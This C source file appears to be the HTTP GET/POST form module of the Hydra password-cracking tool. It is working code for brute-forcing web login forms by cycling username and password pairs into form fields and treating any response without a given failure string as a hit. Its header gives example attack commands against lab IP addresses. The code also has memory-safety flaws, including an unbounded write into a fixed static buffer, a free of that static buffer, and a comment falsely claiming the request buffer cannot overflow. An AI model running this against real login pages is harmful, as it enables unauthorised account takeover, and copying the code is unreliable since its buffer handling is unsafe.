/*
Hydra Form Module
-----------------

The hydra form can be used to carry out a brute-force attack on simple 
web-based login forms that require username and password variables via 
either a GET or POST request.

The module works similarly to the HTTP basic auth module and will honour
proxy mode (with authenticaion) as well as SSL. The module can be invoked
with the service names of "http-get-form", "http-post-form",
"https-get-form" and "https-post-form".

Here's a couple of examples: -

./hydra -l "<userID>" -P pass.txt 10.221.64.12 http-post-form
"/irmlab2/testsso-auth.do:ID=^USER^&Password=^PASS^:Invalid Password"

./hydra -s 443 -l "<username>" -P pass.txt 10.221.64.2 https-get-form 
"/irmlab1/vulnapp.php:username=^USER^&pass=^PASS^:incorrect"

The option field (following the service field) takes three ":" seperated
values, the first is the page on the server to GET or POST to, the second is
the POST/GET variables (taken from either the browser, or a proxy such as
PAROS) with the varying usernames and passwords in the "^USER^" and "^PASS^"
placeholders and the third is the string that it checks for an *invalid*
login - any exception to this is counted as a success.

If you specify the verbose flag (-v) it will show you the response from the 
HTTP server which is useful for checking the result of a failed login to 
find something to pattern match against.


Module written by Phil Robinson, IRM Plc (releases@irmplc.com)

the strrep function was copied from bdarr (at) sse.FU.HAC.COM

*/

#include "hydra-mod.h"

extern char *HYDRA_EXIT;
char *buf;
extern char *webtarget;
extern char *slash;
int webport;


char *strrep(char *string, char *oldpiece, char *newpiece) { 

   int str_index, newstr_index, oldpiece_index, end, 

      new_len, old_len, cpy_len; 
   char *c; 
   static char newstring[1023]; 

   if ((c = (char *) strstr(string, oldpiece)) == NULL) 

      return string; 

   new_len        = strlen(newpiece);
   old_len        = strlen(oldpiece);
   end            = strlen(string)   - old_len;
   oldpiece_index = c - string;


   newstr_index = 0; 
   str_index = 0; 
   while(str_index <= end && c != NULL) 
   { 

      /* Copy characters from the left of matched pattern occurence */
      cpy_len = oldpiece_index-str_index;
      strncpy(newstring+newstr_index, string+str_index, cpy_len);
      newstr_index += cpy_len;
      str_index    += cpy_len;

      /* Copy replacement characters instead of matched pattern */
      strcpy(newstring+newstr_index, newpiece);
      newstr_index += new_len;
      str_index    += old_len;

      /* Check for another pattern match */
      if((c = (char *) strstr(string+str_index, oldpiece)) != NULL)
         oldpiece_index = c - string;


   } 
   /* Copy remaining characters from the right of last matched pattern */    strcpy(newstring+newstr_index, string+str_index); 
   return newstring; 
} 

int start_http_form(int s, unsigned long int ip, int port, unsigned char options, char *miscptr, FILE * fp, char *type) {
  char *empty = "";
  char *login, *pass, buffer[1024], *url, *variables, *updvariables, *upd2variables, *upd3variables, *failcond;
  char *header = "";            /* XXX TODO */
  int found = 0;

  url = strtok(miscptr,":");
  variables = strtok(NULL,":");
  failcond = strtok(NULL,":");
  
  if (strlen(login = hydra_get_next_login()) == 0)
    login = empty;
  if (strlen(pass = hydra_get_next_password()) == 0)
    pass = empty;

  upd2variables = malloc(1024);
  updvariables = strrep(variables, "^PASS^", pass);
  strncpy(upd2variables, updvariables,1023);
  upd3variables = strrep(upd2variables, "^USER^", login);
  
  /* again: no snprintf to be portable. dont worry, buffer cant overflow */

  if (use_proxy == 1 && proxy_authentication != NULL)
    if ( strcmp(type, "GET" ))
    {
      sprintf(buffer, "%s http://%s:%d%.250s HTTP/1.0\r\nHost: %s\r\nProxy-Authorization: Basic %s\r\nUser-Agent: Mozilla/4.0 (Hydra)\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\n\r\n%s\r\n",
            type, webtarget, webport, url, webtarget, proxy_authentication, strlen(upd3variables), upd3variables);
    }
    else
    {
       sprintf(buffer, "%s http://%s:%d%.250s?%.250s HTTP/1.0\r\nHost: %s\r\nProxy-Authorization: Basic %s\r\nUser-Agent: Mozilla/4.0 (Hydra)\r\n%s\r\n",
            type, webtarget, webport, url, upd3variables, webtarget, proxy_authentication, header);
    }
  else {
    if (use_proxy == 1)
  if ( strcmp(type, "GET" ))
    {
      sprintf(buffer, "%s http://%s:%d%.250s HTTP/1.0\r\nHost: %s\r\nUser-Agent: Mozilla/4.0 (Hydra)\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\n\r\n%s\r\n",
            type, webtarget, webport, url, webtarget, strlen(upd3variables), upd3variables);
    }
    else
    {
       sprintf(buffer, "%s http://%s:%d%.250s?%.250s HTTP/1.0\r\nHost: %s\r\nUser-Agent: Mozilla/4.0 (Hydra)\r\n%s\r\n",
            type, webtarget, webport, url, upd3variables, webtarget, header);
    }
    else 
	if ( strcmp(type, "GET" )) 
	{
          sprintf(buffer, "%s %.250s HTTP/1.0\r\nHost: %s\r\nUser-Agent: Mozilla/4.0 (Hydra)\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\n\r\n%s\r\n",
            type, url, webtarget, strlen(upd3variables), upd3variables);
	}
	else
        {
          sprintf(buffer, "%s %.250s?%.250s HTTP/1.0\r\nHost: %s\r\nUser-Agent: Mozilla/4.0 (Hydra)\r\n%s\r\n",
            type, url,  upd3variables, webtarget, header);
	}
  }

  if (hydra_send(s, buffer, strlen(buffer), 0) < 0) {
    free(updvariables);
    free(upd2variables);
    return 1;
  }

  while ( (buf = hydra_receive_line(s)) )
  {
    if ( strstr(buf,failcond) != NULL)
    {
      found = 1;
    }
    if (verbose)
    {  
      printf("%s", buf);
    }
  }

  if ( found != 1 ) 
  {
      hydra_report_found_host(port, ip, "www-form", fp);
      hydra_completed_pair_found();
  }
  else 
  {
      hydra_completed_pair();
  }

/*
    while (hydra_data_ready(s) > 0)
      recv(s, buffer, sizeof(buf), 0);
        buf = hydra_receive_line(s);
*/

  free(buf);
  free(updvariables);
  free(upd2variables);

  if (memcmp(hydra_get_next_pair(), &HYDRA_EXIT, sizeof(HYDRA_EXIT)) == 0)
    return 3;
  return 1;

}

void
service_http_form(unsigned long int ip, int sp, unsigned char options, char *miscptr, FILE * fp, int port, char *type)
{
  int run = 1, next_run, sock = -1;
  int myport = PORT_HTTP, mysslport = PORT_HTTP_SSL;
  struct sockaddr_in targetip;
  char *ptr, *ptr2;

  hydra_register_socket(sp);
  if (memcmp(hydra_get_next_pair(), &HYDRA_EXIT, sizeof(HYDRA_EXIT)) == 0)
    return;

  if ((webtarget = strstr(miscptr, "://")) != NULL) {
    webtarget += strlen("://");
    if ((ptr2 = index(webtarget, ':')) != NULL) { /* step over port if present */
      *ptr2 = 0;
      ptr2++;
      ptr = ptr2;
      if (*ptr == '/' || (ptr = index(ptr2, '/')) != NULL)
        miscptr = ptr;
      else
        miscptr = slash; /* to make things easier to user */
    } else if ((ptr2 = index(webtarget, '/')) != NULL) {
      miscptr = malloc(strlen(ptr2) + 1);
      strcpy(miscptr, ptr2);
      *ptr2 = 0;
    } else
      webtarget = NULL;
  }
  if (cmdlinetarget != NULL && webtarget == NULL)
    webtarget = cmdlinetarget;
  else
   if (webtarget == NULL && cmdlinetarget == NULL) {
    memset(&targetip, 0, sizeof(targetip));
    memcpy(&targetip.sin_addr.s_addr, &ip, 4);
    targetip.sin_family = AF_INET;
#ifdef CYGWIN
    buf = inet_ntoa((struct in_addr) targetip.sin_addr);
#else
    buf = malloc(20);
    inet_ntop(AF_INET, &targetip.sin_addr, buf, 20);
#endif
    webtarget = malloc(strlen(buf) + 1);
    strcpy(webtarget, buf);
#ifndef CYGWIN
    free(buf);
#endif
  }
  if (port != 0)
    webport = port;
  else if ((options & OPTION_SSL) == 0)
    webport = myport;
  else
    webport = mysslport;

  while (1) {
    next_run = 0;
    switch (run) {
    case 1:                    /* connect and service init function */
      {
        if (sock >= 0)
          sock = hydra_disconnect(sock);
//        usleep(275000);
        if ((options & OPTION_SSL) == 0) {
          if (port != 0)
            myport = port;
          sock = hydra_connect_tcp(ip, myport);
          port = myport;
        } else {
          if (port != 0)
            mysslport = port;
          sock = hydra_connect_ssl(ip, mysslport);
          port = mysslport;
        }
        if (sock < 0) {
          fprintf(stderr, "Error: Child with pid %d terminating, can not connect\n", (int) getpid());
          hydra_child_exit(1);
        }
        next_run = 2;
        break;
      }
    case 2:                    /* run the cracking function */
      next_run = start_http_form(sock, ip, port, options, miscptr, fp, type);
      break;
    case 3:                    /* clean exit */
      if (sock >= 0)
        sock = hydra_disconnect(sock);
      hydra_child_exit(0);
      return;
    default:
      fprintf(stderr, "Caught unknown return code, exiting!\n");
      hydra_child_exit(0);
      exit(-1);
    }
    run = next_run;
  }
  if (webtarget != NULL && index(webtarget, ':') == NULL && index(webtarget, '/') != NULL)
    free(miscptr);
}

void
service_http_get_form(unsigned long int ip, int sp, unsigned char options, char *miscptr, FILE * fp, int port)
{
  service_http_form(ip, sp, options, miscptr, fp, port, "GET");
}

void
service_http_post_form(unsigned long int ip, int sp, unsigned char options, char *miscptr, FILE * fp, int port)
{
  service_http_form(ip, sp, options, miscptr, fp, port, "POST");
}
